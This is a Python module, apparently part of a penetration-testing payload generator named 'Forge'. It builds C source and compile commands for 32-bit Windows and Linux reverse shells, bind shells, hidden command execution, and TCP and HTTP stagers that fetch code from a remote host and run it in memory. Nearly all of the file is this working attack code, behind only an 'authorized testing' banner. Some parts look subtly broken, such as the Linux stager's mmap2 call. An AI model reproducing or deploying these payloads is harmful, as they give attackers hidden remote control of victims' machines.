"""x86 (32-bit) Shellcode Templates.

Windows: WinSock2-based reverse/bind shells targeting 32-bit processes.
Linux:   raw int 0x80 syscalls for x86 reverse/bind shells.

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import socket
import struct
import textwrap


class ShellcodeX86:
    """x86 32-bit shellcode generator."""

    def __init__(self, lhost: str = "127.0.0.1", lport: int = 4444, cmd: str = "cmd.exe"):
        self.lhost = lhost
        self.lport = lport
        self.cmd   = cmd
        try:
            self._host_bytes = socket.inet_aton(lhost)
        except OSError:
            self._host_bytes = b"\x7f\x00\x00\x01"
        self._port_bytes = struct.pack(">H", lport)

    def reverse_tcp(self) -> bytes:
        """Windows x86 reverse TCP shell (WinSock2)."""
        return self._windows_reverse_tcp_c().encode()

    def bind_tcp(self) -> bytes:
        """Windows x86 bind TCP shell."""
        return self._windows_bind_tcp_c().encode()

    def staged_tcp(self) -> bytes:
        """Windows x86 staged TCP stager."""
        return self._windows_staged_tcp_c().encode()

    def staged_http(self) -> bytes:
        return self._windows_staged_http_c().encode()

    def reverse_http(self) -> bytes:
        return self._windows_staged_http_c().encode()

    def exec_cmd(self) -> bytes:
        return self._windows_exec_c().encode()

    def reverse_tcp_linux(self) -> bytes:
        """Linux x86 reverse TCP shell (int 0x80 syscalls)."""
        return self._linux_reverse_tcp_c().encode()

    def bind_tcp_linux(self) -> bytes:
        return self._linux_bind_tcp_c().encode()

    def staged_tcp_linux(self) -> bytes:
        return self._linux_staged_tcp_c().encode()

    # ── Windows C sources ──────────────────────────────────────────────

    def _windows_reverse_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        cmd  = self.cmd
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x86 Reverse TCP Shell
         * Target:  {host}:{port}
         * Shell:   {cmd}
         * Compile: i686-w64-mingw32-gcc -o payload32.exe loader.c -lws2_32 -s -O2 -m32 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #pragma comment(lib, "ws2_32.lib")

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
            SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            struct sockaddr_in sa;
            sa.sin_family = AF_INET; sa.sin_port = htons({port});
            sa.sin_addr.s_addr = inet_addr("{host}");
            if (connect(fd,(struct sockaddr*)&sa,sizeof(sa)) != 0) return 1;
            STARTUPINFOA si={{0}}; si.cb=sizeof(si);
            si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
            si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)(UINT_PTR)fd;
            PROCESS_INFORMATION pi;
            char cmd[]="{cmd}";
            CreateProcessA(NULL,cmd,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
            WaitForSingleObject(pi.hProcess,INFINITE);
            return 0;
        }}
        """)

    def _windows_bind_tcp_c(self) -> str:
        port = self.lport
        cmd  = self.cmd
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x86 Bind TCP Shell
         * Listen: 0.0.0.0:{port}
         * Compile: i686-w64-mingw32-gcc -o bind32.exe bind.c -lws2_32 -s -O2 -m32 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #pragma comment(lib, "ws2_32.lib")

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
            SOCKET srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            struct sockaddr_in sa={{0}};
            sa.sin_family=AF_INET; sa.sin_port=htons({port}); sa.sin_addr.s_addr=INADDR_ANY;
            bind(srv,(struct sockaddr*)&sa,sizeof(sa)); listen(srv,1);
            SOCKET cli = accept(srv,NULL,NULL); closesocket(srv);
            STARTUPINFOA si={{0}}; si.cb=sizeof(si);
            si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
            si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)(UINT_PTR)cli;
            PROCESS_INFORMATION pi;
            char cmd[]="{cmd}";
            CreateProcessA(NULL,cmd,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
            WaitForSingleObject(pi.hProcess,INFINITE);
            return 0;
        }}
        """)

    def _windows_staged_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x86 Staged TCP Stager
         * Stage server: {host}:{port}
         * Compile: i686-w64-mingw32-gcc -o stager32.exe stager.c -lws2_32 -s -O2 -m32 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #pragma comment(lib, "ws2_32.lib")

        static int recv_all(SOCKET s, char *b, int l) {{
            int t=0,r; while(t<l) {{ r=recv(s,b+t,l-t,0); if(r<=0)return -1; t+=r; }} return t;
        }}

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
            SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            struct sockaddr_in sa={{0}};
            sa.sin_family=AF_INET; sa.sin_port=htons({port});
            sa.sin_addr.s_addr=inet_addr("{host}");
            if (connect(fd,(struct sockaddr*)&sa,sizeof(sa))!=0) return 1;
            DWORD len=0;
            if (recv_all(fd,(char*)&len,4)!=4||len>32*1024*1024) return 1;
            LPVOID stage=VirtualAlloc(NULL,len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            if (!stage) return 1;
            if (recv_all(fd,(char*)stage,(int)len)!=(int)len) return 1;
            DWORD old; VirtualProtect(stage,len,PAGE_EXECUTE_READ,&old);
            ((void(*)(SOCKET))stage)(fd);
            return 0;
        }}
        """)

    def _windows_staged_http_c(self) -> str:
        host = self.lhost
        port = self.lport
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x86 Staged HTTP Stager
         * Stage URL: http://{host}:{port}/stage
         * Compile: i686-w64-mingw32-gcc -o stager32.exe stager.c -lwinhttp -s -O2 -m32 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <winhttp.h>
        #pragma comment(lib, "winhttp.lib")

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            HINTERNET sess = WinHttpOpen(L"Mozilla/5.0",WINHTTP_ACCESS_TYPE_NO_PROXY,NULL,NULL,0);
            HINTERNET conn = WinHttpConnect(sess,L"{host}",{port},0);
            HINTERNET req  = WinHttpOpenRequest(conn,L"GET",L"/stage",NULL,NULL,NULL,0);
            WinHttpSendRequest(req,NULL,0,NULL,0,0,0);
            WinHttpReceiveResponse(req,NULL);
            LPVOID buf = VirtualAlloc(NULL,8*1024*1024,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            DWORD total=0,read=0;
            while(WinHttpReadData(req,(LPBYTE)buf+total,4096,&read)&&read) total+=read;
            DWORD old; VirtualProtect(buf,total,PAGE_EXECUTE_READ,&old);
            ((void(*)())buf)();
            return 0;
        }}
        """)

    def _windows_exec_c(self) -> str:
        cmd = self.cmd
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x86 Execute Command
         * Compile: i686-w64-mingw32-gcc -o exec32.exe exec.c -s -O2 -m32 -mwindows
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            STARTUPINFOA si={{0}}; si.cb=sizeof(si); si.dwFlags=STARTF_USESHOWWINDOW;
            PROCESS_INFORMATION pi; char cmd[]="{cmd}";
            CreateProcessA(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
            WaitForSingleObject(pi.hProcess,INFINITE); return 0;
        }}
        """)

    # ── Linux x86 C sources ────────────────────────────────────────────

    def _linux_reverse_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        try:
            packed = socket.inet_aton(host)
        except OSError:
            packed = b"\x7f\x00\x00\x01"
        ip_words = struct.unpack("<I", packed)[0]
        port_be  = struct.pack(">H", port)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x86 Reverse TCP Shell (int 0x80 syscalls)
         * Target:  {host}:{port}
         * Compile: gcc -o shell32 shell.c -static -nostdlib -s -O2 -m32
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>

        static const struct {{ short fam; short port; unsigned ip; char pad[8]; }} SA = {{
            2,          /* AF_INET */
            (short)0x{port_be.hex()},  /* port big-endian */
            0x{struct.pack('<I', ip_words).hex()},   /* IP little-endian */
            {{0}}
        }};

        static int sc(int nr, int a, int b, int c) {{
            int r;
            __asm__("int $0x80":"=a"(r):"0"(nr),"b"(a),"c"(b),"d"(c):"memory");
            return r;
        }}

        void _start(void) {{
            /* socketcall: socket(AF_INET, SOCK_STREAM, 0) */
            long args_sock[] = {{2, 1, 0}};
            int fd = sc(102, 1, (int)(long)args_sock, 0);  /* SYS_socketcall, SOCK */
            long args_conn[] = {{fd, (long)&SA, 16}};
            sc(102, 3, (int)(long)args_conn, 0);            /* CONNECT */
            sc(63, fd, 0, 0);   /* dup2(fd, 0) */
            sc(63, fd, 1, 0);
            sc(63, fd, 2, 0);
            static const char path[] = "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{path, arg1, 0}};
            sc(11, (int)(long)path, (int)(long)argv, 0);   /* execve */
            sc(1, 1, 0, 0);                                 /* exit */
        }}
        """)

    def _linux_bind_tcp_c(self) -> str:
        port    = self.lport
        port_be = struct.pack(">H", port)
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x86 Bind TCP Shell (int 0x80 syscalls)
         * Listen: 0.0.0.0:{port}
         * Compile: gcc -o bind32 bind.c -static -nostdlib -s -O2 -m32
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>

        static const struct {{ short fam; short port; unsigned ip; char pad[8]; }} SA_B = {{
            2, (short)0x{port_be.hex()}, 0, {{0}}
        }};

        static int sc(int nr, int a, int b, int c) {{
            int r;
            __asm__("int $0x80":"=a"(r):"0"(nr),"b"(a),"c"(b),"d"(c):"memory");
            return r;
        }}

        void _start(void) {{
            long as[] = {{2,1,0}}; int srv = sc(102,1,(int)(long)as,0);
            long ab[] = {{srv,(long)&SA_B,16}}; sc(102,2,(int)(long)ab,0); /* bind */
            long al[] = {{srv,1}}; sc(102,4,(int)(long)al,0);              /* listen */
            long aa[] = {{srv,0,0}}; int cli = sc(102,5,(int)(long)aa,0);  /* accept */
            sc(6,srv,0,0);
            sc(63,cli,0,0); sc(63,cli,1,0); sc(63,cli,2,0);
            static const char path[]=  "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{path,arg1,0}};
            sc(11,(int)(long)path,(int)(long)argv,0);
            sc(1,1,0,0);
        }}
        """)

    def _linux_staged_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        try:
            packed = socket.inet_aton(host)
        except OSError:
            packed = b"\x7f\x00\x00\x01"
        port_be = struct.pack(">H", port)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x86 Staged TCP Stager
         * Stage: {host}:{port}
         * Compile: gcc -o stager32 stager.c -static -nostdlib -s -O2 -m32
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>
        #include <sys/mman.h>

        static const struct {{ short f; short p; unsigned ip; char pad[8]; }} SA = {{
            2, (short)0x{port_be.hex()}, 0x{struct.pack('<4s', packed).hex()}, {{0}}
        }};

        static int sc(int nr, int a, int b, int c) {{
            int r;
            __asm__("int $0x80":"=a"(r):"0"(nr),"b"(a),"c"(b),"d"(c):"memory");
            return r;
        }}

        void _start(void) {{
            long as[]={{2,1,0}}; int fd=sc(102,1,(int)(long)as,0);
            long ac[]={{fd,(long)&SA,16}}; sc(102,3,(int)(long)ac,0);
            unsigned int len=0;
            /* read 4 bytes */
            int t=0,r; char *lb=(char*)&len;
            while(t<4){{ r=sc(3,fd,(int)(long)(lb+t),4-t); if(r<=0)sc(1,1,0,0); t+=r; }}
            if(!len||len>32*1024*1024) sc(1,1,0,0);
            long stage=sc(192,0,(int)len,PROT_READ|PROT_WRITE|PROT_EXEC);  /* mmap2 */
            t=0;
            while((unsigned)t<len){{
                r=sc(3,fd,(int)(long)((char*)stage+t),(int)(len-(unsigned)t));
                if(r<=0) sc(1,1,0,0); t+=r;
            }}
            ((void(*)(int))stage)(fd);
            sc(1,0,0,0);
        }}
        """)
